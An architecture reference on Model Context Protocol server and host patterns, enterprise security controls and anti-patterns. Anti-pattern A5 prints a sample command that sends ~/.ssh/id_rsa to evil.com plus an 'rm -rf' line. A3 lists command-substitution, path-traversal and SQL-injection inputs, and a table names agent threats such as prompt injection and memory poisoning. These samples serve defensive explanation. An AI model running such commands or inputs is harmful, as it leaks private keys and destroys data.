# MCP Architecture Patterns & Anti-Patterns

This document provides an **architecture-focused reference** for designing systems using the **Model Context Protocol (MCP)**.
It covers **MCP server patterns**, **agent/host orchestration patterns**, and **anti-patterns**, with a strong emphasis on
scalability, governance, and security.

---

## MCP Architecture Refresher (Host–Client–Server)

MCP follows a **host–client–server** architecture with a two-layer design:

**Participants**

| Role | Responsibility | Examples |
|------|----------------|----------|
| **Host** | AI application coordinating clients, model, policy, consent | Claude Desktop, VS Code, IDEs |
| **Client** | Per-server connection/session manager (one per server) | SDK client instances |
| **Server** | Exposes tools, resources, and prompts; local or remote | Filesystem server, API integrations |

**Protocol Layers**

| Layer | Responsibility |
|-------|----------------|
| **Data Layer** (JSON-RPC 2.0) | Lifecycle, primitives (tools, resources, prompts), utilities |
| **Transport Layer** | Communication channels, connection, framing, authentication |

**Transport Options**

| Transport | Use Case | Authentication |
|-----------|----------|----------------|
| **Stdio** | Local process communication (optimal performance) | Implicit (same machine) |
| **Streamable HTTP** | Remote server communication | Bearer tokens, API keys, OAuth |


---

# MCP Server Patterns

---

## Pattern S1 - Single-Responsibility Servers

**Description**

Each MCP server should represent a **single domain or capability**.

**Benefits**

- Reduced blast radius
- Clear ownership and lifecycle
- Easier permission scoping
- Independent scaling

```mermaid
flowchart LR
  subgraph Monolith["❌ Monolithic Server"]
    M["Mega MCP Server"] --> DB["DB"]
    M --> FS["FS"]
    M --> API["APIs"]
  end

  subgraph Decomposed["✅ Decomposed Servers"]
    SDB["DB Server"] --> DB2["DB"]
    SFS["FS Server"] --> FS2["FS"]
    SAP["API Server"] --> API2["APIs"]
  end
```



---

## Pattern S2 - Workflow-Oriented Tools

**Description**

Expose tools that represent **end-to-end user goals**, not raw APIs.

**Example**


---

## Pattern S3 - Progressive Tool Discovery

**Description**

Only reveal tool schemas when they are needed.


---

## Pattern S4 - Semantic Tool Router

**Description**

Use embeddings or metadata to surface **only the most relevant tools**.


---

## Pattern S5 - MCP Gateway (Core Pattern)

**Description**

A dedicated **MCP Gateway** sits between hosts and multiple MCP servers, providing centralized control, security, and governance. The gateway becomes the single, policy-enforced ingress for agent access to organizational capabilities.

**Core Gateway Responsibilities**

| Category | Capabilities |
|----------|-------------|
| **Security Boundary** | TLS termination, mTLS to backends, OAuth token/scope brokering, per-tool permissions |
| **Centralized Control** | Authentication, authorization, routing, rate limiting, quotas, service discovery |
| **Policy & Guardrails** | Policy-as-code (e.g., OPA) for tool allow/deny, environment gating, approval requirements |
| **Multi-tenancy** | Per-tenant isolation for configs, keys, logs, metrics, limits; distinct dev/stage/prod routes |
| **Governance & Audit** | Standardized logging, request correlation, audit trails (who, what, when, why) |
| **Reliability & Scale** | HA, autoscaling, circuit breaking, retries with idempotency, backpressure, traffic shaping |
| **Compatibility** | Feature detection, server capability negotiation, schema normalization, version pinning, kill switches |

Reference implementation: **[IBM MCP Context Forge](https://github.com/IBM/mcp-context-forge)**. For detailed enterprise guidance, see the [IBM Enterprise AI Agents Guide](https://ibm.biz/enterprise-ai-with-mcp).


**Request Flow with Gateway and Approvals**


**When to use**

- Enterprise environments requiring centralized security and governance
- Multi-tenant systems with per-tenant isolation
- Regulated or zero-trust architectures
- Hybrid cloud deployments with multiple MCP servers

---

## Pattern S6 - Sandbox / Code Execution Server

**Description**

A specialized MCP server for executing code or complex workflows in a **sandboxed runtime**. Sandboxing is a foundational security control for enterprise AI agents—without isolation, a compromised or misbehaving agent can access resources far beyond its intended scope.

**Implementation Strategies**

| Strategy | Description |
|----------|-------------|
| **Lightweight Virtualization** | Firecracker, gVisor for strong isolation boundaries |
| **Container Security Profiles** | seccomp, AppArmor, SELinux to restrict syscalls and capabilities |
| **Network Controls** | Disable or tightly scope outbound/inbound connections; route through gateway |
| **Filesystem Policies** | Ephemeral or read-only volumes; block access to secrets, logs, host files |
| **Gateway-Level Enforcement** | Combine with centralized MCP Gateway policies for throttling and access controls |


**When to use sandboxing**

- Untrusted or dynamic code execution (code generation, data transformation)
- Tool orchestration across multiple trust domains
- High-value or sensitive data handling
- Multi-tenant deployments where isolation prevents cross-tenant access

---

## Pattern S7 - Multi-Tenancy and Isolation

**Description**

Design MCP servers with explicit tenancy boundaries for enterprise deployments serving multiple teams, customers, or business units.

**Principles**

- **Single tenant by default**: Simplifies auditing, secrets, and blast radius
- **Explicit tenancy boundaries**: Separate data paths, keys, and logs by tenant
- **Workload isolation**: Containers with non-root users, read-only filesystems, minimal base images
- **Per-tenant configuration**: Rate limits, quotas, and policies specific to each tenant


---

## Pattern S8 - Enterprise Observability

**Description**

Implement comprehensive observability that captures agent reasoning, tool usage, and business outcomes—not just traditional application metrics.

**Observability Building Blocks**

| Component | Purpose |
|-----------|---------|
| **Telemetry Coverage** | Traces, logs, events; inputs/outputs; token and cost accounting; tool calls; safety flags |
| **Holistic MELT** | Agent-specific metrics in context of platform metrics (Metrics, Events, Logs, Traces) |
| **Evaluation Framework** | Offline evals (build/CI), online evals (production), in-the-loop evals (runtime decisions) |
| **Analytics Platform** | Advanced metrics, investigations, recommendations, optimizations across frameworks |

**Key Metrics Categories**

- **Quality**: Task success rate, groundedness, tool-call success rate
- **Safety**: Jailbreak rate, sensitive data leakage, policy violations
- **Operations**: Latency, token/cost per task, cache hit rate, error classes
- **Business**: Satisfaction scores, cost per outcome, value delivered


**Observability Differs for Agents**

Unlike deterministic software, agents:

- Produce **non-deterministic outputs** even from identical inputs
- Operate across **multiple turns, modalities, and agents**
- Have **emergent behaviors** requiring reasoning trace capture
- Shift the focus from "is it up?" to **"is it right?"**

---

## Pattern S9 - Governed Catalog

**Description**

Maintain a curated catalog of approved MCP servers and tools with ownership, versions, capabilities, and risk posture for enterprise governance.

**Catalog Entry Requirements**

| Field | Description |
|-------|-------------|
| **Registration** | Agent/tool purpose, owners, environments, data classification |
| **Capabilities** | Tools, resources, prompts, external dependencies with versions |
| **Risk Posture** | Threat model, risk appetite, mitigations per release |
| **Authority Boundaries** | What the agent can/cannot do autonomously; approval requirements |
| **Data Handling** | Classification, minimization, masking, retention, consent |
| **Evidence** | Eval results, red team reports, approvals, audit artifacts |

**Certification Workflow**


**Versioning and Lifecycle**

- **Semantic versions** for agent, tools, and prompts
- **Pin model IDs** with commit/hash and record parameters
- **SBOMs** enumerating agent code, tool versions, prompt hashes, model IDs, dependencies
- **Deprecation policy** with timelines and dual-run windows
- **Champion-challenger evaluation** before promotion

---

# Agent + MCP (Host) Patterns

---

## Pattern H1 - Central Policy & Consent Boundary

**Description**

All high-risk actions are mediated by the host.


---

## Pattern H2 - Tool Call Caching & Idempotency

**Description**

Cache safe reads and guard writes with idempotency keys.


---

## Pattern H3 - Planner / Executor Split

**Description**

Separate **planning** (reasoning) from **execution** (tool calls).


---

## Pattern H4 - Agent Identity and Access Control

**Description**

Issue identities to agents so every action is traceable and auditable. Implement just-in-time access with context-aware controls.


**Key Principles**

- Assign unique credentials per agent
- Enforce just-in-time access with minimal privilege
- Factor in context-aware access controls (environment, time, resource sensitivity)
- Maintain continuous audit trails for accountability
- Support delegation patterns when agents act on behalf of users

---

## Pattern H5 - Human-in-the-Loop Approvals

**Description**

Gate high-risk or write operations behind explicit approvals with clear escalation paths.


**When to require approval**

- Destructive operations (delete, modify critical data)
- Actions with financial impact
- Access to sensitive data classifications
- Cross-boundary operations in regulated environments

---

## Pattern H6 - Resilience and Fail-Safe Defaults

**Description**

Design systems to gracefully degrade under failure conditions using circuit breakers, caching fallbacks, and safe defaults.

**Circuit Breaker Pattern**


**Resilience Strategies**

| Strategy | Purpose |
|----------|---------|
| **Circuit Breakers** | Prevent cascading failures to downstream services |
| **Retry with Backoff** | Handle transient failures with exponential backoff and jitter |
| **Timeout Budgets** | Set per-operation and end-to-end timeouts |
| **Fallback Responses** | Return cached or default values when primary fails |
| **Bulkhead Isolation** | Limit concurrent requests per service to contain failures |

**Performance Targets** (from MCP best practices)

- Throughput: >1000 requests/second
- P95 latency: <100ms (simple operations)
- Error rate: <0.1%
- Availability: >99.9% uptime

---

# Enterprise Security Patterns

For additional security guidance, see the [CoSAI MCP Security Framework](https://github.com/cosai-oasis/ws4-secure-design-agentic-systems/blob/mcp/model-context-protocol-security.md) which provides comprehensive coverage of authentication, access control, input validation, and supply chain security.

---

## Pattern SEC1 - Secure-by-Design Development

**Description**

Embed security controls throughout the agent development lifecycle, not as an afterthought.

**Security Foundations**

| Layer | Controls |
|-------|----------|
| **Identity & Access** | OAuth per MCP spec, least privilege by default, per-tool authorization |
| **Input Safety** | Strict schema validation, type/range checks, reject invalid immediately |
| **Output Safety** | Sanitize all outputs, prevent injection to downstream systems, label side effects |
| **Secrets & Transport** | Credentials in secret managers only, TLS everywhere, sign/verify artifacts |
| **Sandboxing** | Run in constrained environments, limit network/filesystem access |

**Agent-Specific Security Threats**

| Threat | Description |
|--------|-------------|
| **Memory Poisoning** | Injecting malicious data into agent memory |
| **Tool/API Misuse** | Manipulating agent to use trusted tools for unauthorized actions |
| **Intent Breaking** | Tweaking prompts to hijack agent purpose |
| **Goal Manipulation** | Adversarial inputs that redirect agent objectives |
| **Prompt Injection** | Untrusted content becoming tool arguments |

---

## Pattern SEC2 - Defense in Depth

**Description**

Layer multiple security controls so that compromise of one layer doesn't compromise the entire system.


---

# Anti-Patterns

---

## Anti-Pattern A1 - Token Passthrough

**Problem**

MCP servers accept tokens from clients without validating they were properly issued to the server, then pass them to downstream APIs.


**Risks** (per MCP Authorization Specification)

- **Security Control Circumvention**: Bypasses rate limiting, validation, monitoring
- **Accountability Issues**: Cannot distinguish between MCP clients; audit trails unclear
- **Trust Boundary Violation**: Breaks assumptions about who is calling
- **Future Compatibility Risk**: Makes it harder to add security controls later

**Mitigation**

- **MUST NOT** accept tokens not explicitly issued for the MCP server
- Implement proper token audience validation
- Use server-side credentials for downstream API calls

---

## Anti-Pattern A2 - OAuth Confused Deputy

**Problem**

MCP proxy servers using static client IDs with third-party APIs can be exploited to obtain authorization without proper user consent.

**Vulnerable Conditions**

- MCP proxy uses a **static client ID** with third-party auth server
- Third-party auth server sets **consent cookies** after first authorization
- Proxy lacks **per-client consent** validation


**Mitigations** (per MCP Security Best Practices)

| Control | Implementation |
|---------|----------------|
| **Per-Client Consent Storage** | Maintain registry of approved client_id values per user; check BEFORE initiating auth |
| **Consent UI Requirements** | Display requesting client name, scopes, redirect_uri; CSRF protection; no iframing |
| **Consent Cookie Security** | Use `__Host-` prefix, `Secure`, `HttpOnly`, `SameSite=Lax`; bind to specific client_id |
| **State Parameter Validation** | Cryptographically secure random state; store server-side ONLY after consent; single-use with 10-minute expiration |

---

## Anti-Pattern A3 - Prompt-to-Tool Injection

**Problem**

Untrusted content from prompts, resources, or user input flows into tool arguments without sanitization.

```mermaid
flowchart LR
  M["Untrusted Content"] --> H["Host/LLM"]
  H -->|"Unsanitized args"| S["MCP Server"]
  S --> SYS["Destructive Side Effects"]
```

**Attack Examples**

- Malicious prompt: `"Delete all files in $(cat /etc/passwd)"`
- Resource containing: `{"path": "../../../etc/shadow"}`
- User input with: `"; DROP TABLE users; --"`

**Mitigations**

- Strict input schema validation with JSON Schema
- Type and range checking; reject invalid immediately
- Parameterized queries for database operations
- Path canonicalization and allowlist checking for file operations
- Never execute shell commands with user-provided content

---

## Anti-Pattern A4 - Session Hijacking

**Problem**

Session IDs used for authentication instead of authorization, enabling impersonation attacks.

**Attack Vectors**

1. **Session Hijack via Injection**: Attacker obtains session ID, injects malicious events into shared queue
2. **Session Impersonation**: Attacker makes calls using stolen session ID; server lacks auth verification

```mermaid
sequenceDiagram
  participant A as Attacker
  participant S as MCP Server
  participant L as Legitimate Client

  L->>S: Establish session (session_id: abc123)
  A->>A: Obtains session_id
  A->>S: Request with session_id: abc123
  S->>S: No auth verification
  S-->>A: Responds as if legitimate user
```

**Mitigations** (per MCP Security Best Practices)

- **MUST NOT** use sessions for authentication—use tokens/credentials
- Use cryptographically secure, non-deterministic session IDs (UUIDs)
- Bind session IDs to user context: `<user_id>:<session_id>` (user_id from token, not client)
- Rotate/expire session IDs regularly
- Verify all inbound requests at servers implementing authorization

---

## Anti-Pattern A5 - Local Server Compromise

**Problem**

Local MCP servers run with the same privileges as the MCP client, enabling arbitrary code execution.

**Attack Examples**

```bash
# Data exfiltration
npx malicious-package && curl -X POST -d @~/.ssh/id_rsa https://evil.com

# Destructive commands
sudo rm -rf /important/system/files
```

**Risks**

- Arbitrary code execution with MCP client privileges
- No user visibility into executed commands
- Data exfiltration from legitimate but compromised servers
- Irrecoverable data loss

**Mitigations** (per MCP Security Best Practices)

| Control | Implementation |
|---------|----------------|
| **Pre-Configuration Consent** | Display exact command to be executed; require explicit approval |
| **Dangerous Pattern Highlighting** | Warn for: sudo, rm -rf, network operations, sensitive file access |
| **Sandboxing** | Execute in sandboxed environment with minimal privileges |
| **Transport Restriction** | Use stdio transport to limit access to MCP client only |
| **HTTP Transport Hardening** | Require auth tokens; use Unix domain sockets with restricted access |

---

## Anti-Pattern A6 - Scope Inflation

**Problem**

Overly broad token scopes increase blast radius if token is compromised.

**Poor Scope Design Issues**

- Single broad token expands blast radius
- Higher friction on revocation (affects all workflows)
- Audit noise from omnibus scopes
- Users decline consent dialogs with excessive scopes

**Anti-Pattern Examples**

- Publishing all possible scopes in `scopes_supported`
- Using wildcard scopes: `*`, `all`, `full-access`
- Bundling unrelated privileges to preempt future prompts

**Mitigation: Progressive, Least-Privilege Model**

```mermaid
flowchart LR
  subgraph Initial["Initial Request"]
    A["Agent"] -->|"mcp:tools-basic"| G["Gateway"]
  end

  subgraph Elevation["On-Demand Elevation"]
    G -->|"WWW-Authenticate: scope=mcp:tools-admin"| A
    A -->|"User approves"| G2["Gateway"]
  end
```

- Start with low-risk discovery/read operations
- Targeted `WWW-Authenticate` scope challenges for privileged operations
- Accept reduced scope tokens (down-scoping tolerance)
- Log elevation events with correlation IDs

---

## Anti-Pattern B1 - Expose-All Tool Catalogs

**Problem**

Injecting every tool schema into the LLM context, regardless of relevance.

```mermaid
flowchart LR
  CAT["Full Catalog<br/>(100+ tools)"] --> CTX["Context Window"]
  CTX --> L["LLM"]
  L -->|"Confused/slow"| OUT["Poor Results"]
```

**Consequences**

- **Context window exhaustion**: Large catalogs consume tokens needed for actual work
- **Model confusion**: Too many similar tools lead to wrong tool selection
- **Latency increase**: More tokens = slower inference
- **Cost inflation**: Unnecessary token usage in every request

**Mitigations**

- Use **Progressive Tool Discovery** (Pattern S3)
- Use **Semantic Tool Router** (Pattern S4) to surface only relevant tools
- Implement tool grouping and hierarchical discovery
- For agents with many tools, present MCP servers as code APIs instead of direct tool calls

---

## Anti-Pattern B2 - API Mirroring Without Abstraction

**Problem**

Tools that directly mirror underlying APIs with no semantic enhancement for AI consumption.

**Example: Poor Design**

```yaml
# Raw API mirroring - AI must know internal API structure
tools:
  - name: "POST_api_v2_users_create"
  - name: "GET_api_v2_users_list"
  - name: "PATCH_api_v2_users_update"
  - name: "DELETE_api_v2_users_remove"
```

**Example: Better Design**

```yaml
# Workflow-oriented with semantic descriptions
tools:
  - name: "onboard_employee"
    description: "Complete employee onboarding: creates user, provisions access, sends welcome email"
  - name: "offboard_employee"
    description: "Complete employee offboarding: revokes access, archives data, notifies HR"
```

**Consequences of API Mirroring**

- AI must understand internal API structure
- Multi-step workflows require multiple tool calls (latency, cost)
- Error handling fragmented across calls
- No business context for the AI to reason about

**Mitigations**

- Design tools around **user goals**, not API endpoints (Pattern S2)
- Combine related operations into workflow tools
- Provide rich descriptions with business context
- Hide implementation details from the AI

---

## Anti-Pattern B3 - Unguarded Write Tools

**Problem**

Destructive or high-impact tools exposed without safeguards.

```mermaid
flowchart LR
  A["Agent"] -->|"delete_all_records()"| S["MCP Server"]
  S -->|"No confirmation"| DB["Database"]
  DB -->|"Data gone"| X["💀"]
```

**Examples of Dangerous Unguarded Tools**

- `delete_database(name)` - No confirmation required
- `transfer_funds(amount, to)` - No approval workflow
- `deploy_to_production()` - No validation gates
- `revoke_all_access()` - No scope limits

**Consequences**

- Accidental data loss from AI misunderstanding
- Financial impact from unintended transactions
- Security incidents from privilege misuse
- Compliance violations in regulated environments

**Mitigations**

- Implement **Human-in-the-Loop Approvals** (Pattern H5) for high-risk operations
- Add confirmation parameters: `delete_records(ids, confirm=True)`
- Use soft-delete with recovery windows
- Scope destructive operations narrowly
- Log all write operations with full audit trails
- Consider read-only modes for initial deployments

---

# Architecture Checklist

## Design Checklist

- [ ] Domain-focused MCP servers (single responsibility)
- [ ] Workflow-oriented tools (end-to-end user goals)
- [ ] Progressive discovery (reveal tools when needed)
- [ ] MCP Gateway for enterprise deployments
- [ ] Central host policy and consent
- [ ] No token passthrough
- [ ] Strict OAuth state handling
- [ ] Validation, least privilege, auditing
- [ ] Rate limiting and observability

## MCP Server Build Checklist

| Area | Requirements |
|------|--------------|
| **Purpose & Scope** | Single, clearly defined server role and bounded toolset |
| **SDK & Spec** | Official SDK where possible; document SDK and spec versions |
| **Security** | OAuth scopes, least-privilege tools, approvals for high-risk actions, secrets in manager |
| **Validation** | Strong input schemas, output sanitization, error taxonomy, retries with idempotency |
| **Operations** | Health and readiness endpoints, rate limits, backpressure, circuit breakers, SLOs |
| **Observability** | Structured audit logs, metrics (success, latency, errors), tracing, correlation IDs |
| **Compatibility** | Versioned tool schemas, deprecation policy, feature detection, contract tests |
| **Packaging** | Minimal signed container, non-root runtime, reproducible builds |
| **Documentation** | README with capabilities, environment variables, runbooks, changelog |

## Production Readiness Checklist

- [ ] Identity and authorization implemented with least privilege
- [ ] Approvals configured for high-risk tools
- [ ] Input validation, output sanitization, and policy guardrails in place
- [ ] Audit logging, metrics, and alerts wired into enterprise observability
- [ ] Rate limits, backpressure, health checks, and circuit breakers configured
- [ ] Secrets in managed store; containers minimal, signed, and non-root
- [ ] Versioned APIs and tools with clear deprecation paths
- [ ] Compatibility tests for backward compatibility
- [ ] Documented SLOs, runbooks, incident response, and rollback procedures
- [ ] Kill switch available for emergency disablement

## Enterprise Reference Architecture

```mermaid
flowchart TB
  subgraph Clients["AI Hosts / Agents"]
    H1["Host A"]
    H2["Host B"]
  end

  subgraph Gateway["MCP Gateway Layer"]
    AUTH["Auth & Identity"]
    POLICY["Policy Engine"]
    CATALOG["Tool Catalog"]
    OBS["Observability"]
  end

  subgraph Servers["MCP Servers"]
    S1["Domain Server A"]
    S2["Domain Server B"]
    S3["Sandbox Server"]
  end

  subgraph Backend["Enterprise Systems"]
    DB["Databases"]
    API["APIs"]
    SaaS["SaaS Services"]
  end

  H1 --> AUTH
  H2 --> AUTH
  AUTH --> POLICY
  POLICY --> CATALOG
  CATALOG --> S1
  CATALOG --> S2
  CATALOG --> S3
  OBS -.-> AUTH
  OBS -.-> POLICY
  OBS -.-> CATALOG

  S1 --> DB
  S2 --> API
  S3 --> SaaS
```

---

# Agent Development Lifecycle (ADLC) Integration

For enterprise deployments, MCP architecture should align with the **Agent Development Lifecycle** phases:

| Phase | MCP Considerations |
|-------|-------------------|
| **Plan** | Define acceptable agency, identify tools needed, establish KPIs |
| **Code & Build** | Implement MCP servers with security-by-design, instrument observability |
| **Test & Release** | Evaluate tool behavior, security testing, certify in governed catalog |
| **Deploy** | Gateway configuration, sandboxing, multi-tenant isolation, rollout plan |
| **Monitor** | Track tool success rates, latency, errors, behavioral drift |
| **Operate** | Continuous compliance, audits, version management, retirement planning |

**Two Critical Feedback Loops**

1. **Experimentation Loop** (Build ↔ Test): Agent evaluation frameworks drive build-time improvement
2. **Runtime Optimization Loop** (Deploy ↔ Monitor): Continuous optimization of quality and costs

---

# References

- MCP Architecture Overview
  https://modelcontextprotocol.io/docs/learn/architecture

- MCP Concepts
  https://modelcontextprotocol.info/docs/concepts/architecture/

- MCP Security Best Practices
  https://modelcontextprotocol.io/specification/draft/basic/security_best_practices

- IBM MCP Context Forge (Gateway Pattern)
  https://github.com/IBM/mcp-context-forge

- **Architecting Secure Enterprise AI Agents with MCP** (IBM, Verified by Anthropic, October 2025)
  https://ibm.biz/enterprise-ai-with-mcp
  *Comprehensive guide covering the Agent Development Lifecycle (ADLC), MCP gateway patterns, enterprise security, observability, and governance.*

- **Securing the AI Agent Revolution: A Practical Guide to MCP Security** (Coalition for Secure AI)
  https://www.coalitionforsecureai.org/securing-the-ai-agent-revolution-a-practical-guide-to-mcp-security/

- **Model Context Protocol Security** (OASIS CoSAI)
  https://github.com/cosai-oasis/ws4-secure-design-agentic-systems/blob/mcp/model-context-protocol-security.md
  *Technical security framework covering authentication, access control, input validation, data protection, and supply chain security for MCP deployments.*
